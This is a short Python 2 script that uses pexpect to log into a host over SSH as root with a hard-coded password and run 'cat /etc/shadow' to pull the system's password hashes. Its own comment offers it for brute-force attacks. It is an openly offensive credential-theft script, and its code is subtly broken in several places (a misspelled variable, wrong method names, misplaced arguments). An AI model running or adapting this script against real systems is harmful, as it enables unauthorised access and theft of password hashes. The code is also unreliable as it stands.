'''
this script connects to a given host via ssh, and returns the shadow file.
It can be used to perform brute-force attacks
'''
import pexpect
PROMPT=['#','>>>','>','\$']

def send_command(child,cmd):
  child.sendline(cmd)
  child.expect(PROMT)
  print child.before

def connect(user,host,password):
  ssh_newkey = 'Are you sure you want to continue connecting'
  connStr = 'ssh ' + user + '@' + host
  child = pexpect.spawn(connStr)
  print "spawnie el hijo"
  ret = child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword:'])
  print "-------------------" + ret
  if ret == 0:
    print '[-] Error connecting'
    return
  if ret == 1:
    child.sendLine('yes')
    ret = child.expect([pexpect.TIMEOUT],'[P|p]assword')
  if ret == 0:
    print '[-] Error connecting'
    return
  print "aca voy"
  child.sendline(password)
  child.expect(PROMPT)
  return child

def main():
  host = '192.168.56.101'
  user = 'root'
  password = 'linux2013!'
  child = connect(user,host,password)
  send_command(child, 'cat /etc/shadow')

if __name__ == '__main__':
  main()
